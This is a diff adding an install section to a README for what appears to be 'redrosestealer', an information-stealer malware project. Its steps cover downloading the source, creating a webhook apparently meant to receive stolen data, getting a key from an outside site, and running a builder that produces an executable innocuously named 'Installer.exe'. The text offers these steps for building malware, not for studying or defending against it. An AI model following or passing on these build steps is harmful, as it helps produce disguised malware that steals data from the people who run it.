@@ -1,0 +1,20 @@
+## Install
+
+### Prerequisites
+
+-   Windows 10/11
+-   [Python](https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe)
+-   [Git](https://git-scm.com/download/win)
+
+### Setup
+
+1. [Download source code zip](https://codeload.github.com/pixelar56/redrosestealer/zip/refs/heads/main)
+2. Extract zip
+3. First create webhook ![image](https://github.com/user-attachments/assets/fb1ec3e7-a2c6-4a67-a9e4-da3294c5fc97)
+![image](https://github.com/user-attachments/assets/f38739a2-9167-48dd-92da-a41fcfed5ebb)
+![image](https://github.com/user-attachments/assets/5385ee29-213e-4771-820c-87c9673d23a1)
+4. and go website https://welovebadge.com/redrosewbk/createkey create u key
+5. replace you key on xx.js
+6. ![image](https://github.com/user-attachments/assets/18268a59-1f4f-4e4c-b441-d55bc1cb4044)
+7. Run the builder by double clicking the `build.bat` file
+8. Follow instructions in builder and your exe will be found in the `output` folder under the name `Installer.exe`
